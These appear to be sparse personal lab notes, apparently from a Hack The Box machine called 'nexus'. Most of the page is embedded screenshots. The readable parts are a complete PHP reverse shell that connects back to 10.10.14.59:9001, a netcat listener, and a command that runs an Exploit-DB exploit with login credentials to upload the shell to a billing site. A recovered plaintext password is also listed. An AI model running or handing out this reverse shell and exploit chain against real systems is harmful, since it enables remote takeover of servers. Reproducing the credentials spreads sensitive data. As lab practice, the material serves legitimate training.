
![[Pasted image 20260719013935.png]]




![[Pasted image 20260719014026.png]]


![[Pasted image 20260719014056.png]]


![[Pasted image 20260719014156.png]]


![[Pasted image 20260719014242.png]]

![[Pasted image 20260719082532.png]]



![[Pasted image 20260719082557.png]]


![[Pasted image 20260719093811.png]]


![[Pasted image 20260719093900.png]]


https://www.exploit-db.com/exploits/52629


```
<?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = "1.0"; $ip = '10.10.14.59'; $port = 9001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise. This is quite common and not fatal."); } chdir("/"); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array( 0 => array("pipe", "r"), // stdin is a pipe that the child will read from 1 => array("pipe", "w"), // stdout is a pipe that the child will write to 2 => array("pipe", "w") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print "$string\n"; } } ?>
```


```
nc -lvnp 9001
```


```
python3 52629.py -t http://billing.nexus.htb/ -u j.matthew@nexus.htb -p N27xhnano php-reverse-shell.php2ucY04 -f php-reverse-shell.php
```


![[Pasted image 20260719094650.png]]

![[Pasted image 20260719095617.png]]


![[Pasted image 20260719095723.png]]


password- `y27xb3ha!!74GbR`

![[Pasted image 20260719105425.png]]


